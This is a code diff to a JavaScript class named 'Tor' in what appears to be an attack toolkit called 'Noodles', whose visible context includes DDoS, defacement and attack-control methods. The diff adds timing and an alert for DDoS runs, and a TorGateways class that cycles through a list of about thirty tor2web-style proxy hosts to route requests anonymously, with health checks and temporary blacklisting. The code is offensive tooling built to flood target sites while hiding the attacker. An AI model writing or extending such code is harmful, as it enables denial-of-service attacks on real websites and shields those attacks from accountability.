@@ -130,6 +130,10 @@ class Tor {
             reportFormat: "JSON"      // Default report format
         };
 
+        // Add start and stop time for the DDoS attack
+        this.ddosAttackStartTime = null;
+        this.ddosAttackEndTime = null;
+
     }
 
     // Noodles Initialization and Global Consent
@@ -146,6 +150,12 @@ class Tor {
             this.setupEncryption();
             this.setupDefacement();
             this.startAutoReportSaving();
+
+            // Initialize TorGateways
+            this.initializeTorGateways();
+
+            // New code for managing Tor gateways
+            this.torGateways = new TorGateways(this);
 
         } else {
             this.closeSite();
@@ -344,6 +354,9 @@ class Tor {
 
     async startDDoS(url) {
         this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
+
+        // Record start time
+        this.ddosAttackStartTime = new Date();
         this.ddosThreads = [];
 
         const endTime = Date.now() + (this.ddosConfig.duration * 1000);
@@ -371,12 +384,30 @@ class Tor {
 
         await Promise.all(this.ddosThreads);
 
+        // Record end time
+        this.ddosAttackEndTime = new Date();
         this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
         this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${this.ddosConfig.threads} threads.`);
+        this.displayDDoSTimer();  // Display timer after the attack is complete
+    }
+
+    // Function to display the DDoS timer
+    displayDDoSTimer() {
+        if (this.ddosAttackStartTime && this.ddosAttackEndTime) {
+            const duration = (this.ddosAttackEndTime.getTime() - this.ddosAttackStartTime.getTime()) / 1000;
+            alert(`DDoS attack ran for ${duration} seconds.`);
+            this.logToConsole(`DDoS attack ran for ${duration} seconds.`);
+        } else {
+            alert('DDoS attack timer not available.');
+        }
     }
 
     stopDDoS() {
         this.stopAttack();
+
+        // Clear the start and end times
+        this.ddosAttackStartTime = null;
+        this.ddosAttackEndTime = null;
     }
 
     delay(ms) {
@@ -638,6 +669,182 @@ class Tor {
         this.activeAttackType = null;
         this.targetURL = null;
         this.attackConfig = {};
+    }
+
+     // Initialize Tor Gateways
+     initializeTorGateways() {
+        this.torGateways = new TorGateways(this);
+        this.logToConsole("Tor Gateways initialized.");
+    }
+}
+
+// TorGateways class to handle gateway management
+class TorGateways {
+    constructor(torInstance) {
+        this.torInstance = torInstance;
+        this.gateways = [
+            "https://onion.city",
+            "https://onion.cab",
+            "https://onion.direct",
+            "https://onion.sh",
+            "https://onion.link",
+            "https://onion.ws",
+            "https://onion.pet",
+            "https://onion.rip",
+            "https://onion.plus",
+            "https://onion.top",
+            "https://onion.si",
+            "https://onion.ly",
+            "https://onion.my",
+            "https://onion.lu",
+            "https://onion.casa",
+            "https://onion.com.de",
+            "https://onion.foundation",
+            "https://onion.rodeo",
+            "https://onion.lat",
+            "https://tor2web.org",
+            "https://tor2web.fi",
+            "https://tor2web.blutmagie.de",
+            "https://tor2web.to",
+            "https://tor2web.io",
+            "https://tor2web.in",
+            "https://tor2web.it",
+            "https://tor2web.xyz",
+            "https://tor2web.su",
+            "https://darknet.to",
+            "https://s1.tor-gateways.de",
+            "https://s2.tor-gateways.de",
+            "https://s3.tor-gateways.de",
+            "https://s4.tor-gateways.de",
+            "https://s5.tor-gateways.de"
+        ];
+        this.currentIndex = 0;
+        this.failedGateways = new Set();
+        this.maxRetries = 5;
+        this.requestTimeout = 8000;
+        this.gatewayBlacklistDuration = 60000;
+        this.gatewayCheckEnabled = true;
+        this.isCheckingGateways = false;
+        this.gatewayCheckTimeout = 5000;
+
+        this.startGatewayMonitoring();
+    }
+
+    // Method to start gateway monitoring
+    startGatewayMonitoring() {
+        if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
+        this.isCheckingGateways = true;
+
+        setInterval(() => {
+            this.checkGateways();
+        }, 60000);
+
+        this.torInstance.logToConsole("Gateway monitoring started.");
+    }
+
+    // Method to check gateways
+    async checkGateways() {
+        if (this.isCheckingGateways) return;
+        this.isCheckingGateways = true;
+
+        this.torInstance.logToConsole("Checking Tor Gateways...");
+
+        for (const gateway of this.gateways) {
+            if (!this.failedGateways.has(gateway)) {
+                try {
+                    const status = await this.checkGatewayStatus(gateway);
+                    this.torInstance.logToConsole(`Gateway ${gateway} status: ${status}`);
+                } catch (error) {
+                    this.torInstance.logToConsole(`Error checking ${gateway}: ${error}`);
+                }
+            }
+        }
+
+        this.isCheckingGateways = false;
+        this.torInstance.logToConsole("Tor Gateways check complete.");
+    }
+
+    // Method to check the status of a single gateway
+    async checkGatewayStatus(gateway) {
+        try {
+            const response = await fetch(gateway, {
+                method: 'GET',
+                timeout: this.gatewayCheckTimeout,
+                headers: {
+                    'User-Agent': 'Noodles Gateway Checker'
+                }
+            });
+
+            if (response.ok) {
+                return "Online";
+            } else {
+                this.blacklistGateway(gateway);
+                return `Offline (Status: ${response.status})`;
+            }
+        } catch (error) {
+            this.blacklistGateway(gateway);
+            return `Error: ${error}`;
+        }
+    }
+
+    // Method to blacklist a gateway
+    blacklistGateway(gateway) {
+        this.failedGateways.add(gateway);
+        setTimeout(() => {
+            this.failedGateways.delete(gateway);
+            this.torInstance.logToConsole(`Gateway ${gateway} removed from blacklist.`);
+        }, this.gatewayBlacklistDuration);
+
+        this.torInstance.logToConsole(`Gateway ${gateway} blacklisted.`);
+    }
+
+    // Method to get the next available gateway
+    getNextGateway() {
+        let retries = 0;
+        while (retries < this.maxRetries) {
+            const gateway = this.gateways[this.currentIndex];
+            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
+
+            if (!this.failedGateways.has(gateway)) {
+                return gateway;
+            }
+
+            retries++;
+        }
+
+        return null;
+    }
+
+    // Method to perform a fetch request through a Tor gateway
+    async fetchThroughGateway(url, options = {}) {
+        const gateway = this.getNextGateway();
+        if (!gateway) {
+            throw new Error("No available Tor gateways.");
+        }
+
+        const torURL = `${gateway}/${url}`;
+        try {
+            const response = await fetch(torURL, options);
+            if (!response.ok) {
+                throw new Error(`Request failed with status: ${response.status}`);
+            }
+            return response;
+        } catch (error) {
+            this.torInstance.logToConsole(`Gateway ${gateway} failed: ${error}`);
+            this.failedGateways.add(gateway);
+            throw error;
+        }
+    }
+
+    // Method to handle raw fetch requests
+    async rawFetch(url, options = {}) {
+        try {
+            const response = await this.fetchThroughGateway(url, options);
+            return response;
+        } catch (error) {
+            this.torInstance.logToConsole(`Raw fetch failed: ${error}`);
+            throw error;
+        }
     }
 }
 
